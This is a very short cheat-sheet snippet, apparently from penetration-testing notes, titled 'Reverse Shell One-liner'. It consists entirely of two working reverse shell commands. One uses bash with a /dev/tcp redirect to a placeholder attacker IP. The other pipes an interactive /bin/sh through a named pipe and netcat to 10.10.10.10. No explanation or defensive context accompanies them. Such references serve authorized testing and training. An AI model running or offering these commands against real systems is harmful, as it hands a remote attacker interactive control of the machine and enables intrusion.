#### Reverse Shell One-liner
```
bash -i >& /dev/tcp/{attacker IP}/8080 0>&1
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
